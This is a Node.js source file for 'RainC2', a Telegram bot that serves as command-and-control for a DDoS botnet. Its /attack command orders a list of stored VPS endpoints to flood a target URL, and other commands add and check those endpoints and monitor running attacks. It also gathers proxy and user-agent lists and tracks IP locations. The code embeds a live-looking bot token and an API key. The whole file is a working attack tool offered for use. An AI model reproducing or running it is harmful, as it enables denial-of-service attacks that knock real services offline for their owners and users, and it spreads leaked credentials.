#!/usr/bin/env node

const { Telegraf } = require('telegraf');
const { exec, spawn } = require('child_process');
const url = require('url');
const fs = require('fs');
const axios = require('axios');
const path = require('path');

const version = '7.0.0';
const bot = new Telegraf('8219882191:AAHsRc-bQ2nTzn0f5toaI2d86CDd6nej1aI');

let processList = [];
let authorizedUsers = new Set(); // Store authorized user IDs

// [========================================] //
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// [========================================] //
async function banner(ctx) {
    const welcomeMsg = `
[SYSTEM] Welcome To RainC2
[SYSTEM] Owner Tools: t.me/@Steveezarex
Please Type /help for Show All Menu
_________________________________________________
`;
    return welcomeMsg;
}

// [========================================] //
async function scrapeProxy() {
    try {
        const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
        const data = await response.text();
        fs.writeFileSync('proxy.txt', data, 'utf-8');
        return true;
    } catch (error) {
        console.error(`Error fetching proxy data: ${error.message}`);
        return false;
    }
}

async function scrapeUserAgent() {
    try {
        const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
        const data = await response.text();
        fs.writeFileSync('ua.txt', data, 'utf-8');
        return true;
    } catch (error) {
        console.error(`Error fetching user-agent data: ${error.message}`);
        return false;
    }
}

// [========================================] //
function clearUserAgent() {
    if (fs.existsSync('ua.txt')) {
        fs.unlinkSync('ua.txt');
    }
}

// [========================================] //
async function authenticateUser(ctx) {
    try {
        const secretBangetJir = await fetch('https://raw.githubusercontent.com/D4youXTool/cache/main/sigma.txt');
        const password = await secretBangetJir.text();
        
        return ctx.message.text.trim() === password.trim();
    } catch (error) {
        console.error('Authentication error:', error);
        return false;
    }
}

// [========================================] //
async function AttackBotnetEndpoints(target, duration, methods, ctx) {
    if (!target || !duration || !methods) {
        return ctx.reply('Example: /attack https://google.com 120 flood');
    }

    try {
        const parsedUrl = new url.URL(target);
        const hostname = parsedUrl.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = scrape.data;

        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        processList.push({ target, methods, startTime, duration, endTime, ip: result.query });
        
        const now = new Date();
        const options = { month: 'short', day: 'numeric', year: 'numeric', timeZone: 'Asia/Jakarta' };
        const formattedDate = now.toLocaleString('en-US', options);

        const attackDetails = `
🚀 Attack Details
   Status: ✅ Attack Sent Successfully All Servers
   Host: ${target}
   Port: 443
   Time: ${duration}s
   Methods: ${methods}
   Sent On: ${formattedDate}

🎯 Target Details
   ASN: ${result.as}
   ISP: ${result.isp}
   ORG: ${result.org}
   Country: ${result.country}

⚠️ Note: Not Spam Attack
`;
        
        await ctx.reply(attackDetails);

        let botnetData;
        let successCount = 0;
        const timeout = 20000;
        const validEndpoints = [];

        // Load botnet data
        try {
            botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
        } catch (error) {
            botnetData = { endpoints: [] };
        }

        // Send requests to each endpoint
        const requests = botnetData.endpoints.map(async (endpoint) => {
            const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

            try {
                const response = await axios.get(apiUrl, { timeout });
                if (response.status === 200) {
                    successCount++;
                    validEndpoints.push(endpoint);
                }
            } catch (error) {
                console.error(`Error sending request to ${endpoint}: ${error.message}`);
            }
        });

        await Promise.all(requests);

        // Save valid endpoints back to the file
        botnetData.endpoints = validEndpoints;
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));

        await ctx.reply(`✅ Attack completed! ${successCount} servers responded successfully.`);

    } catch (error) {
        await ctx.reply(`❌ Error retrieving target information: ${error.message}`);
    }
}

function methods(ctx) {
    try {
        const methodsData = JSON.parse(fs.readFileSync('lib/methods.json', 'utf-8'));
        
        let response = `📋 Available Methods:\n\n`;
        response += `NAME       │ DESCRIPTION                    │ DURATION\n`;
        response += `───────────┼────────────────────────────────┼──────────\n`;

        methodsData.forEach(method => {
            response += `${method.name.padEnd(10)} │ ${method.description.padEnd(30)} │ ${method.duration.padEnd(3)}\n`;
        });

        ctx.reply(response);
    } catch (error) {
        ctx.reply('❌ Error loading methods data.');
    }
}

async function processBotnetEndpoint(endpointUrl, ctx) {
    if (!endpointUrl) {
        return ctx.reply('Example: /addvps http://1.1.1.1:2000/RainC2');
    }

    try {
        const parsedUrl = new url.URL(endpointUrl);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/RainC2';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return ctx.reply(`⚠️ Endpoint ${endpoint} is already in the botnet list.`);
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));

        ctx.reply(`✅ Endpoint ${endpoint} added to botnet.`);
    } catch (error) {
        ctx.reply(`❌ Error processing botnet endpoint: ${error.message}`);
    }
}

async function trackIP(ipAddress, ctx) {
    if (!ipAddress) {
        return ctx.reply('Example: /trackip 1.1.1.1');
    }

    if (ipAddress === '0.0.0.0') {
        return ctx.reply('🚫 Invalid IP address provided.');
    }

    try {
        const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
        const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ipAddress}`);
        const res = await fetch(`https://ipwho.is/${ipAddress}`);
        const additionalInfo = await res.json();
        const ipInfo = await response.json();

        const trackResult = `
🌍 IP Tracking Results for ${ipAddress}

📍 Location Info:
   - Country: ${ipInfo.country_name}
   - Capital: ${ipInfo.country_capital}
   - City: ${ipInfo.city}
   - ISP: ${ipInfo.isp}
   - Organization: ${ipInfo.organization}
   - Coordinates: ${ipInfo.latitude}, ${ipInfo.longitude}
      
🗺️ Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`;
        
        await ctx.reply(trackResult);
    } catch (error) {
        await ctx.reply(`❌ Error tracking ${ipAddress}: ${error.message}`);
    }
}

async function monitorOngoingAttacks(ctx) {
    // Filter processes that are still running
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        return ctx.reply("📊 No attacks are currently running.");
    }

    let attackDetails = `🔄 Running Attacks:\n\n`;
    attackDetails += `#  │ HOST                    │ SINCE │ DURATION │ METHOD\n`;
    attackDetails += `───┼─────────────────────────┼───────┼──────────┼────────\n`;

    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration}s`;

        attackDetails += `${String(index + 1).padEnd(2)} │ ${host.padEnd(23)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods}\n`;
    });

    ctx.reply(attackDetails);
}

async function checkBotnetEndpoints(ctx) {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        botnetData = { endpoints: [] };
    }

    // Send test requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);
    
    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));

    ctx.reply(`✅ Botnet check completed! ${successCount} servers are online.`);
}

async function subdomen(domain, ctx) {
    if (!domain) {
        return ctx.reply('Example: /subdo starsx.tech');
    }

    try {
        let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
        let subdomains = response.data.data;

        if (subdomains && subdomains.length > 0) {
            let result = `🔍 Subdomains found for ${domain}:\n\n`;
            result += subdomains.map((data, index) => `${index + 1}. ${data}`).join('\n');
            ctx.reply(result);
        } else {
            ctx.reply(`❌ No subdomains found for ${domain}`);
        }
    } catch (error) {
        ctx.reply(`❌ Error finding subdomains: ${error.message}`);
    }
}

// [========================================] //
// Telegram Bot Commands
// [========================================] //

bot.start(async (ctx) => {
    const welcomeMsg = await banner(ctx);
    ctx.reply(welcomeMsg + '\n\n🤖 RainC2 Telegram Bot is now active!\nUse /help to see available commands.');
});

bot.help((ctx) => {
    const helpText = `
🤖 *RainC2 Telegram Bot Commands*

📋 *Basic Commands:*
/start - Start the bot
/help - Show this help message
/auth <password> - Authenticate with password

🎯 *Attack Commands:*
/attack <target> <duration> <method> - Launch DDoS attack
/monitor - Show running attacks
/methods - Show available methods

🌐 *Botnet Management:*
/addvps <endpoint> - Add new server
/listvps - Check botnet servers status

🔍 *Tools:*
/trackip <ip> - Track IP address info
/subdo <domain> - Find subdomains

ℹ️ *Info:*
/credits - Show creator credits
/news - Show latest news
`;
    ctx.reply(helpText, { parse_mode: 'Markdown' });
});

bot.command('auth', async (ctx) => {
    const password = ctx.message.text.split(' ')[1];
    if (!password) {
        return ctx.reply('❌ Please provide password. Usage: /auth <password>');
    }

    const isValid = await authenticateUser(ctx);
    if (isValid) {
        authorizedUsers.add(ctx.from.id);
        await scrapeProxy();
        await scrapeUserAgent();
        ctx.reply('✅ Authentication successful! Bot is now ready to use.');
    } else {
        ctx.reply('❌ Wrong password! Access denied.');
    }
});

bot.command('attack', (ctx) => {
    const userId = ctx.from.id;
    if (!authorizedUsers.has(userId)) {
        return ctx.reply('❌ Please authenticate first using /auth <password>');
    }

    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) {
        return ctx.reply('❌ Example: /attack https://google.com 120 flood');
    }

    const [target, duration, methods] = args;
    AttackBotnetEndpoints(target, duration, methods, ctx);
});

bot.command('methods', (ctx) => {
    methods(ctx);
});

bot.command('addvps', async (ctx) => {
    const userId = ctx.from.id;
    if (!authorizedUsers.has(userId)) {
        return ctx.reply('❌ Please authenticate first using /auth <password>');
    }

    const endpointUrl = ctx.message.text.split(' ')[1];
    processBotnetEndpoint(endpointUrl, ctx);
});

bot.command('listvps', (ctx) => {
    const userId = ctx.from.id;
    if (!authorizedUsers.has(userId)) {
        return ctx.reply('❌ Please authenticate first using /auth <password>');
    }

    checkBotnetEndpoints(ctx);
});

bot.command('monitor', (ctx) => {
    const userId = ctx.from.id;
    if (!authorizedUsers.has(userId)) {
        return ctx.reply('❌ Please authenticate first using /auth <password>');
    }

    monitorOngoingAttacks(ctx);
});

bot.command('trackip', (ctx) => {
    const ipAddress = ctx.message.text.split(' ')[1];
    trackIP(ipAddress, ctx);
});

bot.command('subdo', (ctx) => {
    const domain = ctx.message.text.split(' ')[1];
    subdomen(domain, ctx);
});

bot.command('credits', (ctx) => {
    const creatorCredits = `
ᴄʀᴇᴅɪᴛs
ᴏᴡɴᴇʀ: Stevee
ᴠᴇʀsɪᴏɴ: v2
`;
    ctx.reply(creatorCredits);
});

bot.command('news', async (ctx) => {
    try {
        const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`);
        const latestNews = await getNews.text();
        ctx.reply(`📰 Latest News:\n\n${latestNews}`);
    } catch (error) {
        ctx.reply('❌ Error fetching news.');
    }
});

// Error handling
bot.catch((err, ctx) => {
    console.error(`❌ Error for ${ctx.updateType}:`, err);
    ctx.reply('❌ An error occurred while processing your request.');
});

// Cleanup function
function clearall() {
    clearUserAgent();
}

process.on('exit', clearall);
process.on('SIGINT', () => {
    clearall();
    process.exit();
});
process.on('SIGTERM', () => {
    clearall();
    process.exit();
});

// Start the bot
console.log('🤖 RainC2 Telegram Bot is starting...');
bot.launch();

console.log('✅ Bot is running!');
console.log('📱 Use /start to begin interaction');